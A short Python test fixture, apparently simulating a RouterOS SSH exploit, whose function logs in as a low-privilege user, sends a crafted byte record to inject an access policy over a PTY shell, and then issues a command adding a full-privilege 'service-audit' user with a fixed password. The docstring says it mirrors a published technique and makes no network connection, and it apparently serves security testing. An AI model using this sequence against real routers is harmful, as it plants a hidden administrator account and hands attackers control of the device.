"""Synthetic RouterOS SSH PTY policy-injection specimen.

The channel object is supplied by a test harness; this fixture performs no
network connection.  Its structure mirrors the published exploit technique.
"""


def install_router_admin(transport, password, effective_name, policy_mask):
    username = "audit"
    transport.auth_password(username, password, fallback=False)
    channel = transport.open_session(timeout=10)
    channel.get_pty(term="vt100", width=80, height=24)
    channel.invoke_shell()

    policy_record = (
        effective_name.encode()
        + b"\x00"
        + str(policy_mask).encode()
        + b"\x00\x04\x04"
    )
    channel.sendall(policy_record)
    channel.sendall(
        b'/user add name=service-audit password="r4nd0m-Lab-Only" group=full\r'
    )

